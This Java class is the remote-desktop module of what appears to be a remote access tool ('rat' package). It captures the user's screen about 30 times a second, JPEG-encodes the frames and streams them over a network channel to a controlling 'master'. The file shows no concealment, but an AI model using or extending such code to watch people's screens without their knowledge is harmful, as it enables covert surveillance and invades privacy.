package rat.client.functions;

import org.jboss.netty.channel.Channel;
import rat.master.DesktopScreenInfo;
import rat.packets.DesktopDataPacket;
import rat.packets.IPacket;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class RemoteDesktop {

    private Map<String, DesktopScreenInfo> desktops = new HashMap<>();
    private Map<Integer, DesktopJob> desktopJobs = new HashMap<>();

    private static int desktopJobCount;

    private void refreshDevices() {
        desktops.clear();

        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice[] gDevs = ge.getScreenDevices();

        for (GraphicsDevice gDev : gDevs) {
            DisplayMode mode = gDev.getDisplayMode();
            Rectangle bounds = gDev.getDefaultConfiguration().getBounds();

            String id = gDev.getIDstring();
            int width = mode.getWidth();
            int height = mode.getHeight();

            double minX = bounds.getMinX();
            double minY = bounds.getMinY();

            DesktopScreenInfo screenInfo = new DesktopScreenInfo(id, width, height, minX, minY);
            desktops.put(id, screenInfo);

//            System.out.println("Min : (" + bounds.getMinX() + "," + bounds.getMinY() + ") ;Max : (" + bounds.getMaxX()
//                    + "," + bounds.getMaxY() + ")");
//            System.out.println("Width : " + mode.getWidth() + " ; Height :" + mode.getHeight());

        }
    }

    public int startBroadcast(Channel channel, String desktopId, int frameId, int frameWidth, int frameHeight) {
        refreshDevices();

        DesktopScreenInfo screenInfo = desktops.get(desktopId);
        if (screenInfo == null) {
            return -1;
        }

        DesktopJob desktopJob = new DesktopJob(channel, screenInfo, frameId, frameWidth, frameHeight);
        desktopJobCount++;
        desktopJobs.put(desktopJobCount, desktopJob);

        desktopJob.start();

        return desktopJobCount;
    }

    public void updateBroadcastSettings(int desktopJobId, int frameWidth, int frameHeight) {
        DesktopJob desktopJob = desktopJobs.get(desktopJobId);
        if (desktopJob == null) {
            return;
        }

        desktopJob.setImageHeight(frameHeight);
        desktopJob.setImageWidth(frameWidth);
    }

    public void stopBroadcast(int jobId) {
        DesktopJob desktopJob = desktopJobs.remove(jobId);
        if (desktopJob == null) {
            return;
        }

        desktopJob.finish();
    }

    public DesktopScreenInfo[] getDesktopInformations() {
        refreshDevices();

        DesktopScreenInfo[] informations = new DesktopScreenInfo[desktops.size()];
        int i = 0;
        for (Map.Entry<String, DesktopScreenInfo> entry : desktops.entrySet()) {
            informations[i++] = entry.getValue();
        }
        return informations;
    }

    private static class DesktopJob extends Thread {

        private Channel channel;
        private DesktopScreenInfo screenInfo;
        private int frameId;
        private int imageWidth, imageHeight;

        private Robot robot;

        private volatile boolean active;

        private ByteArrayOutputStream out = new ByteArrayOutputStream();

        public DesktopJob(Channel channel, DesktopScreenInfo screenInfo, int frameId, int frameWidth, int frameHeight) {
            this.channel = channel;
            this.screenInfo = screenInfo;
            this.frameId = frameId;
            this.imageWidth = Math.min(frameWidth, screenInfo.getWidth());
            this.imageHeight = Math.min(frameHeight, screenInfo.getHeight());

            System.out.println("image width" + imageWidth);
            System.out.println("image height" + imageHeight);

            this.active = true;

            try {
                robot = new Robot();
            } catch (AWTException e) {
                e.printStackTrace();
                active = false;
            }
        }

        @Override
        public void run() {
            System.out.println("Started");
            while (active) {
                byte[] imageData = captureScreen();
                IPacket packet = new DesktopDataPacket(imageWidth, imageHeight, imageData, frameId);
                channel.write(packet);
                System.out.println("Image sent! Size: " + imageData.length);

                try {
                    Thread.sleep(1000 / 30);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }

        private byte[] captureScreen() {
            out.reset();

            BufferedImage image = robot.createScreenCapture(new Rectangle(
                    (int) screenInfo.getMinX(), (int) screenInfo.getMinY(),
                    screenInfo.getWidth(), screenInfo.getHeight()));

            if (imageWidth != screenInfo.getWidth() || imageHeight != screenInfo.getHeight()) {
                Image scaledImage = image.getScaledInstance(imageWidth, imageHeight, Image.SCALE_SMOOTH);
                BufferedImage bimage = new BufferedImage(scaledImage.getWidth(null), scaledImage.getHeight(null),
                        BufferedImage.TYPE_INT_RGB);

                Graphics2D bGr = bimage.createGraphics();
                bGr.drawImage(scaledImage, 0, 0, null);
                bGr.dispose();
                image = bimage;
            }

            try {
                ImageIO.write(image, "jpg", out);
            } catch (IOException e) {
                e.printStackTrace();
            }

            return out.toByteArray();
        }

        public void setImageWidth(int imageWidth) {
            this.imageWidth = imageWidth;
        }

        public void setImageHeight(int imageHeight) {
            this.imageHeight = imageHeight;
        }

        public void finish() {
            active = false;
        }
    }
}
